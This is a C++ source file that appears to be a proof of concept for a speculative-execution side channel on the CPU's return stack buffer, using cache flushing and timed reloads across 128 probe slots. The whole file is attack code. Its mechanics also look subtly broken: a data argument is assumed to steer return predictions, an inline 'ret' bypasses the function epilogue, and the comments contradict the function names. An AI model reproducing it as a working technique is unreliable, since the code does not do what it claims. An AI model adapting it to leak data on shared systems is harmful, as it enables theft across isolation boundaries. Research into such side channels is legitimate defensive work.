#include <array>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <x86intrin.h>

constexpr size_t kMaxGadgetIndex = 128;
constexpr size_t kNumRSBEntries = 32;
constexpr size_t kPageSize = 4096;
constexpr int CACHE_HIT_THRESHOLD = 80;

// Global probe array with 128 entries
uint8_t probe_array[kMaxGadgetIndex * kPageSize] __attribute__((aligned(4096)));

// Measures access time to detect cache hit
bool ReloadAccess(uint8_t *addr) {
  unsigned int junk;
  uint64_t start = __rdtscp(&junk);
  volatile uint8_t val = *addr;
  uint64_t end = __rdtscp(&junk);
  return (end - start) < CACHE_HIT_THRESHOLD;
}

// DC-Gadget: Touches a specific cache line to mark it in probe_array
__attribute__((noinline)) void RSBGadget(size_t i) {
  asm volatile("" ::: "memory");
  if (i < kMaxGadgetIndex) {
    volatile uint8_t dummy = probe_array[i * kPageSize];
  }
}

// Fills the RSB with return addresses to a specific gadget index
void FillRSBWithGadget(size_t gadget_index) {
  for (size_t i = 0; i < kNumRSBEntries; ++i) {
    RSBGadget(gadget_index);  // Each call pushes same gadget index
  }
}

// Flush the probe_array from the cache
void FlushProbeArray() {
  for (size_t i = 0; i < kMaxGadgetIndex; ++i) {
    _mm_clflush(&probe_array[i * kPageSize]);
  }
}

// Detects which gadget index was speculatively executed
int DetectUsedGadgetIndex() {
  for (size_t i = 0; i < kMaxGadgetIndex; ++i) {
    if (ReloadAccess(&probe_array[i * kPageSize])) {
      return i;
    }
  }
  return -1;
}

// Dummy misprediction trigger
__attribute__((noinline)) void TriggerFalseReturn(int depth) {
  if (depth > 0) {
    TriggerFalseReturn(depth - 1);
  } else {
    asm volatile("lfence; ret");
  }
}

// Corrupts RSB with invalid return target
__attribute__((noinline)) void TriggerTrueReturn(int depth) {
  if (depth > 0) {
    TriggerTrueReturn(depth - 1);
  } else {
    TriggerFalseReturn(kNumRSBEntries);  // Misreturns to previous stack
  }
}

int main() {
  std::cout << "[+] Starting RSB DC Gadget Access Sweep (0–127)...\n";

  for (size_t gadget = 0; gadget < kMaxGadgetIndex; ++gadget) {
    FillRSBWithGadget(gadget);             // Step 1: Fill RSB with this gadget index
    FlushProbeArray();                     // Step 2: Flush full probe array
    TriggerTrueReturn(kNumRSBEntries);     // Step 3: Corrupt RSB with mispredicted returns
    int hit = DetectUsedGadgetIndex();     // Step 4: Check which gadget was speculatively executed

    if (hit == static_cast<int>(gadget)) {
      std::cout << "[+] HIT  at gadget[" << gadget << "]\n";
    } else if (hit != -1) {
      std::cout << "[?]  Mismatch: filled " << gadget << ", speculated " << hit << "\n";
    } else {
      std::cout << "[-]  No hit for gadget[" << gadget << "]\n";
    }
  }

  std::cout << "\n[+] Sweep complete.\n";
  return 0;
}
